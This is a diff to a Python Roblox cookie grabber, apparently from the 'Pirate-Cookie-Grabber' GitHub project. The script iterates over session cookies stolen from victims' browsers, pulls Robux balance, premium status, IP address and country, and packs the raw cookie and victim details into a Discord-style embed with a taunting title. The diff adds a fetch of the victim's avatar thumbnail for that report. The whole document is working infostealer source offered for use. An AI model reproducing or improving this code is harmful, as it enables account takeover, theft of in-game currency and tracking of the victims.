@@ -98,7 +98,12 @@ for browser, roblox_cookie in cookies:
     robux = info['RobuxBalance']
     premium = info['IsPremium']
     url2 = f"http://ipinfo.io/{ip_address}/json"
+    response = requests.get(f'https://thumbnails.roblox.com/v1/users/avatar?userIds={rid}&size=150x150&format=png')
+    data = response.json()
 
+    if 'data' in data and len(data['data']) > 0:
+        thumbnail_url = data['data'][0]['imageUrl']
+    
     # Send a GET request to the ipinfo.io API
     response = requests.get(url2)
 
@@ -106,12 +111,11 @@ for browser, roblox_cookie in cookies:
     data = response.json()
     country = data.get("country", "Unknown")
     country_flag = f":flag_{country.lower()}:"
-
     embed_payload = {
         "embeds": [
             {   
                 "username": "MrBreast",
-                "title": "**Jesse We got an other one**",
+                "title": "**Jesse We got an other one** <:Waltermin:1227280337478881311>",
                 "description": f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})||```fix\n{roblox_cookie}\n```||",
                 "color": 12452044,
                 "author": {
@@ -130,7 +134,7 @@ for browser, roblox_cookie in cookies:
                     {"name": "IP Address", "value": ip_address, "inline": True},
                     {"name": "Country", "value": f"{country} {country_flag}", "inline": True}
                 ],
-                "thumbnail": {"url": headshot}
+                "thumbnail": {"url": thumbnail_url}
             }
         ]
     }
